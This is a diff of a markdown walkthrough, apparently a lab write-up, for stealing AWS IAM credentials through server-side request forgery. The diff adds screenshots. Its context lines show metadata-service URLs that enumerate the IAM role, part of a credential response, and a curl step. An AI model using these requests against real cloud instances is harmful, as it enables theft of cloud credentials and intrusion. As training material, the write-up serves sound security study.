@@ -85,12 +85,18 @@ local-ipv4
 placement/
 ```
 
+<img width="2280" height="1176" alt="image" src="https://github.com/user-attachments/assets/96583ff9-12af-4d39-bac2-4124f6e5dec8" />
+
+
 **Step 4.2 — Enumerate the IAM path:**
 ```
 # Submit URL:
 http://169.254.169.254/latest/meta-data/iam/
 ```
 Output: `info` and `security-credentials/`
+
+<img width="1713" height="836" alt="image" src="https://github.com/user-attachments/assets/7d089730-3990-4b95-bc43-8da453794b2b" />
+
 
 **Step 4.3 — List the IAM role name:**
 ```
@@ -100,6 +106,9 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/
 Output: `pul-cloud-role`
 
 ---
+
+<img width="1969" height="639" alt="image" src="https://github.com/user-attachments/assets/7dad4515-5b45-4f08-b3d8-7beb708bc9b6" />
+
 
 ## Step 5 — Steal the IAM Credentials (THE GOAL)
 
@@ -120,6 +129,8 @@ Response:
   "LastUpdated": "2024-11-15T06:00:00Z"
 }
 ```
+<img width="1828" height="624" alt="image" src="https://github.com/user-attachments/assets/5082f168-3815-4a2c-b0b8-551f1a3f99bb" />
+
 
 **Or via API + curl (no browser needed):**
 ```bash
